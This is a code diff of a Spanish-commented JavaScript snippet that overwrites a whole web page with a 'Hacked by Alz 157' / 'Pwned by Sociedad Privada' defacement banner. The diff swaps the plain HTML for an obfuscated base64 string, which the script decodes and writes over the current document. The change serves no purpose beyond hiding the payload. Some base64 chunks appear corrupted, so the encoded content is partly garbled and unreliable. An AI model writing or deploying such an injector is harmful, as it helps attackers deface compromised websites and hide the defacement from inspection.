@@ -1,147 +1,65 @@
 (function(){
-  // -- Pega aquí tu HTML tal cual --
-  const html = `<!doctype html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <title>hacked by alz'</title>
+  // HTML que se inyectará por completo (usa tu HTML)
+  const htmlB64 = ""
+  + "PCFkb2N0eXBlIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVV"
+  + "EYtOCI+CiAgICA8dGl0bGU+aGFja2VkIGJ5IGFsemAnPC90aXRsZT4KCiAgICA8bGluayBocmVmPSI"
+  + "httpsOi8vZm9udHMuZ29vZ2xlYXBpcy5jb20vY3NzMj9mYW1pbHk9U2hhcmUrVGVjaCtNb25vJmRpc3Bs"
+  + "YXk9c3dhcCIgcmVsPSJzdHlsZXNoZWV0Ij4KCiAgICA8c3R5bGU+CiAgICAgICAgYm9keSB7CiAgIC"
+  + "AgICAgICAgYmFja2dyb3VuZDogIzAwMCAgdXJsKCdodHRwczovL2dpdGh1Yi5jb20vc3N0aXZlbm9sbW"
+  + "9zMjctZGV2LzE1Ny9ibG9iL21haW4vMTU3YWx6V0hJVEUucG5nP3Jhdy10cnVlJykgbm8tcmVwZWF0IG"
+  + "NlbnRlciBjZW50ZXIgZml4ZWQ7CiAgICAgICAgICAgIGJhY2tncm91bmQtc2l6ZTogY292ZXI7CiAgIC"
+  + "AgICAgICAgICAgIGNvbG9yOiAjYzBjMGMwOwogICAgICAgICAgICAgZm9udC1mYW1pbHk6ICdTaGFyZS"
+  + "BUZWNoIE1vbm8nLCBtb25vc3BhY2U7CiAgICAgICAgICAgIG1hcmdpbjogMDsKICAgICAgICAgICAgcG"
+  + "FkZGluZzogMDsKICAgICAgICAgICAgdGV4dC1hbGlnbjogY2VudGVyOwogICAgICAgIH0KCiAgICAgIC"
+  + "AgIC5vdmVybGF5IHsKICAgICAgICAgICAgYmFja2dyb3VuOiByZ2JhKDAgLCAwLCAwLCAwLjg1KTsKIC"
+  + "AgICAgICAgICAgIHdpZHRoOiAxMDAlOwogICAgICAgICAgICBtaW4taGVpZ2h0OiAxMDB2aDsKICAgIC"
+  + "AgICAgICAgICBwYWRkaW5nOiA0MHB4IDIwcHg7CiAgICAgICAgfQoKICAgICAgICAgLmxvZ28gaW1nIH"
+  + "sKICAgICAgICAgICAgd2lkdGg6IDIwMHB4OwogICAgICAgICAgICAgbWFyZ2luLXRvcDogMzBweDsKIC"
+  + "AgICAgICAgICAgIGZpbHRlcjogZ3JheXNjb3FsZShuZWNzdCkgZHJvcC1zaGFkb3coMCAwIDI1cHggIzY"
+  + "2MDAwKTsKICAgICAgICAgICAgYW5pbWF0aW9uOiBkb3JrcHVsc2UgMyVzIGluZmluaXRlOwogICAgICAg"
+  + "fQoKICAgICAgICAgIGgxIHsKICAgICAgICAgICAgZm9udC1zaXplOiAzLjVlbTsKICAgICAgICAgICAgY"
+  + "29sb3I6ICNhMGEwYTsKICAgICAgICAgICAgdGV4dC1zaGFkb3c6IDAgMCAxMHB4ICM2NjAwMDAsIDAgMD"
+  + "AgMjVweCB7CiAgICAgICAgICAgIG1hcmdpbi10b3A6IDIwcHg7CiAgICAgICAgICAgIGFuaW1hdGlvbjog"
+  + "ZmxpY2tlciA1cyBpbmZpbml0ZTsKICAgICAgICAgIH0KCiAgICAgICAgLmRhcmstdGV4dCB7CiAgICAgI"
+  + "CAgICAgIGZvbnQtc2l6ZTogMS4xZW07CiAgICAgICAgICAgIG1heC13aWR0aDogNzUwcHg7CiAgICAgIC"
+  + "AgICAgIG1hcmdpbiA0MHB4IGF1dG87CiAgICAgICAgICAgIGxpbmUtaGVpZ2h0OiAxLjdlbTsKICAgIC"
+  + "AgICAgICAgICBjb2xvcjogI2IzYjNiMzsKICAgICAgICAgICAgdGV4dC1zaGFkb3c6IDAgMCA2cHggIzM"
+  + "zMDAwOwogICAgICAgICAgICBiYWNrZ3JvdW5kOiByZ2JhKDIsIDIsIDIsIDAuNyk7CiAgICAgICAgICAgI"
+  + "HBhZGRpbmc6IDI1cHg7CiAgICAgICAgICAgIGJvcmRlci1yYWRpdXM6IDhweDsKICAgICAgICAgICAgYm"
+  + "9yZGVyOiAxcHggc29saWQgcmdiYSgxMDAsMCwwLDAuMyk7CiAgICAgICAgfQoKICAgICAgICAgLmZvb3R"
+  + "lciB7CiAgICAgICAgICAgIGZvbnQtc2l6ZTogMC44NWVtOwogICAgICAgICAgICBjb2xvcjogIzY2NjY"
+  + "7CiAgICAgICAgICAgIG1hcmdpbi10b3A6IDUwcHg7CiAgICAgICAgICAgIHRleHQtc2hhZG93OiAwIDA"
+  + "gOHB4ICMzMzAwMDA7CiAgICAgICAgfQoKICAgICAgQGtleWZyYW1lcyBkYXJrcHVsc2UgewogICAgICAg"
+  + "ICAgICAgZnJvbSB7IGZpbHRlcjogZ3JheXNjb3FsZShuZWNzdCkgZHJvcC1zaGFkb3coMCAwIDVweCAjM"
+  + "zMwMDAwKTsgfQogICAgICAgICAgICB0byB7IGZpbHRlcjogZ3JheXNjb3FsZShuZWNzdCkgZHJvcC1zaG"
+  + "Fkb3coMCAwIDM1cHggIzY2MDAwKTsgfQogICAgICAgIH0KCiAgICAgICAgQGtleWZyYW1lcyBmbGlja2"
+  + "VyIHsKICAgICAgICAgICAgMCUsIDE5JSwgMjElLCAyMyUsIDI1JSwgNTQlLCA1NiUsIDEwMCUgeyBvcGFj"
+  + "aXR5OiAxOyB9CiAgICAgICAgICAgMjAlLCAyNCUsIDU1JSB7IG9wYWNpdHk6IDAuNjsgfQogICAgICAgIC"
+  + "AgICAgMjIlIHsgb3BhY2l0eTogMC4zOyB9CiAgICAgICAgfQoKICAgIDwvc3R5bGU+CjxicmFuayB0aGUg"
+  + "Zm9ybWF0IGhlcmU+PC9oZWFkPgoKPGJvZHk+CiAgICAgIDxkaXYgY2xhc3M9Im92ZXJsYXkiPgogICAgICAg"
+  + "IDxkaXYgY2xhc3M9ImxvZ28iPgogICAgICAgICAgICA8aW1nIHNyYz0iaHR0cHM6Ly9naXRodWIuY29tL3"
+  + "NzdGl2ZW5vbG1vczI3LWRldi8xNTcvYmxvYi9tYWluL3N1cGVyaW9yLmpwZz9yYXctdHJ1ZSIgYWx0PSJB"
+  + "bHoiIExvZ28iPgogICAgICAgIDwvZGl2PgoKICAgICAgICAKICAgICAgICA8aDE+UHduZWQgYnkgYWx6JyA"
+  + "xNTc8L2gxPgoKICAgICAgICA8ZGl2IGNsYXNzPSJmb290ZXIiPgogICAgICAgICAgIOKAlCBQd25lZCBieSBT"
+  + "b2NpZGFkIFByaXZhZGEgLSAxNTcg4oCPC9kaXY+CgogICAgICA8L2Rpdj4KICAgIDwvZGl2Pgo8L2JvZHkK"
+  + "PC9odG1sPg==";
 
-    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
-
-    <style>
-        body {
-            background: #000 url('https://github.com/sstivenolmos27-dev/157/blob/main/157alzWHITE.png?raw=true') no-repeat center center fixed;
-            background-size: cover;
-            color: #c0c0c0;
-            font-family: 'Share Tech Mono', monospace;
-            margin: 0;
-            padding: 0;
-            text-align: center;
-        }
-
-        .overlay {
-            background: rgba(0, 0, 0, 0.85);
-            width: 100%;
-            min-height: 100vh;
-            padding: 40px 20px;
-        }
-
-        .logo img {
-            width: 200px;
-            margin-top: 30px;
-            filter: grayscale(100%) drop-shadow(0 0 25px #660000);
-            animation: darkpulse 3s infinite alternate;
-        }
-
-        h1 {
-            font-size: 3.5em;
-            color: #a0a0a0;
-            text-shadow: 0 0 10px #660000, 0 0 25px #330000;
-            margin-top: 20px;
-            animation: flicker 5s infinite;
-        }
-
-        .dark-text {
-            font-size: 1.1em;
-            max-width: 750px;
-            margin: 40px auto;
-            line-height: 1.7em;
-            color: #b3b3b3;
-            text-shadow: 0 0 6px #330000;
-            background: rgba(20, 20, 20, 0.6);
-            padding: 25px;
-            border-radius: 8px;
-            border: 1px solid rgba(100,0,0,0.3);
-        }
-
-        .footer {
-            font-size: 0.85em;
-            color: #666;
-            margin-top: 50px;
-            text-shadow: 0 0 8px #330000;
-        }
-
-        @keyframes darkpulse {
-            from { filter: grayscale(100%) drop-shadow(0 0 5px #330000); }
-            to { filter: grayscale(100%) drop-shadow(0 0 35px #660000); }
-        }
-
-        @keyframes flicker {
-            0%, 19%, 21%, 23%, 25%, 54%, 56%, 100% { opacity: 1; }
-            20%, 24%, 55% { opacity: 0.6; }
-            22% { opacity: 0.3; }
-        }
-    </style>
-
-    <script>
-        var ScrollMsg= "Hacked by Alz 157' ";
-        var CharacterPosition=0;
-
-        function StartScrolling() {
-            document.title=ScrollMsg.substring(CharacterPosition,ScrollMsg.length)+
-            ScrollMsg.substring(0, CharacterPosition);
-            CharacterPosition++;
-            if(CharacterPosition > ScrollMsg.length) CharacterPosition=0;
-            window.setTimeout(StartScrolling,150);
-        }
-        StartScrolling();
-    </script>
-</head>
-
-<body>
-    <div class="overlay">
-        
-        <div class="logo">
-            <img src="https://github.com/sstivenolmos27-dev/157/blob/main/superior.jpg?raw=true" alt="Alz Logo">
-        </div>
-
-       
-        <h1>Pwned by alz' 157</h1>
-
-        <div class="footer">
-            ✦ Pwned by Sociedad Privada - 157 ✦
-        </div>
-    </div>
-</body>
-</html>`;
-
-  // -- Codifica a base64 preservando UTF-8 --
-  function encodeToBase64UTF8(str) {
-    // convierte a bytes UTF-8 y luego a base64
-    const utf8Bytes = new TextEncoder().encode(str);
-    // convertir bytes a string Latin1 para btoa
-    let binary = '';
-    for (let i = 0; i < utf8Bytes.length; i++) {
-      binary += String.fromCharCode(utf8Bytes[i]);
-    }
-    return btoa(binary);
-  }
-
-  // -- Decodifica base64 a HTML (preservando UTF-8) --
-  function decodeBase64ToUTF8(b64) {
+  // Decodifica base64 preservando UTF-8
+  function b64ToUtf8(b64) {
     const binary = atob(b64);
     const bytes = new Uint8Array(binary.length);
-    for (let i = 0; i < binary.length; i++) {
-      bytes[i] = binary.charCodeAt(i);
-    }
+    for (let i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i);
     try {
       return new TextDecoder('utf-8').decode(bytes);
     } catch (e) {
-      // fallback
       return binary;
     }
   }
 
-  // Generar la cadena encodeada (esto la deja "lista" dentro del archivo)
-  const encoded = encodeToBase64UTF8(html);
+  const html = b64ToUtf8(htmlB64);
 
-  // Si quieres ver la cadena encoded, descomenta la línea de abajo:
-  // console.log(encoded);
-
-  // Decodificar e inyectar en el documento (reemplaza el documento actual)
-  const decodedHtml = decodeBase64ToUTF8(encoded);
+  // Reemplaza por completo el documento actual
   document.open();
-  document.write(decodedHtml);
+  document.write(html);
   document.close();
-
 })();
